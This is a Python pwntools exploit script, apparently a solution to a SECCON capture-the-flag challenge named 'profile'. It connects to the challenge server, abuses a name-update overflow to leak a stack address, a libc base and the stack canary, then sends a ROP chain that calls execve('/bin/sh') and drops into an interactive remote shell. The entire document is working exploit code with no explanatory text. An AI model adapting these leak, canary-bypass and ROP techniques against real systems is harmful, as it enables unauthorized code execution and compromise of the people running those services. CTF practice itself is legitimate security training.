from pwn import *

context.arch = 'amd64'
r = remote('profile.pwn.seccon.jp', 28553)
#r = process('./profile', env={'LD_PRELOAD': './libc.so'})


def update(name):
    r.sendlineafter('>>', '1')
    r.sendlineafter('>>', name)

def show():
    r.sendlineafter('>>', '2')

r.sendlineafter('>>', '12345678')
r.sendlineafter('>>', '123')
r.sendlineafter('>>', 'A')

pop_rdi = 0x401713
read = 0x400e30
libc_start_main = 0x602030
out = 0x400e10
main = 0x4011dd

payload = 'A'*0x10 + '\x80'
#raw_input('#')
update(payload)
show()
r.recvuntil('Name : ')
stack = u64(r.recvn(6).ljust(8,'\x00'))
log.info('stack: 0x%x' % stack)


payload = 'A'*0x10 + p64(libc_start_main)
update(payload)
show()
r.recvuntil('Name : ')
libc = u64(r.recvn(6).ljust(8,'\x00')) - 0x20740
log.info('libc: 0x%x' % libc)

payload = 'A'*0x10 + p64(stack+0x28)
update(payload)
show()
r.recvuntil('Name : ')
canary = u64(r.recvn(8))
log.info('canary: 0x%x' % canary)


raw_input('#')
system = libc + 0x45390
payload = '/bin/sh\x00' + '\x00'*0x30 + p64(canary) + '\x00'*0x18 + p64(pop_rdi) + p64(libc+0x18cd57) + p64(libc+0x1150c9) + p64(0) *2 + p64(libc+0x33544) + p64(0x3b) +p64(libc+0xbc375)
update(payload)


r.interactive()
